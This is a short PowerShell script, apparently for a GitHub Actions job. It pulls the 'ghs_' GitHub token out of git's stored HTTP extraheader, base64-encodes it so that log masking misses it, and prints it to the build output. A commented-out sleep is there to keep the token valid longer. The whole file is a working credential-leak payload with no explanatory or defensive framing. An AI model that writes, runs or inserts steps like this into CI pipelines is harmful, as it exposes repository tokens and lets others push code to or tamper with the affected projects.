$extraheader = git config --get http.https://github.com/.extraheader
$authHeader = $extraheader | Select-String -Pattern 'ghs_[0-9A-Za-z]{20,}' | ForEach-Object { $_.Matches.Value }
$authHeaderBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("AUTHORIZATION: basic $authHeader"))

# Print the base64-encoded value
Write-Output $authHeaderBase64

# Sleep for 3 minutes
#Start-Sleep -Seconds 180
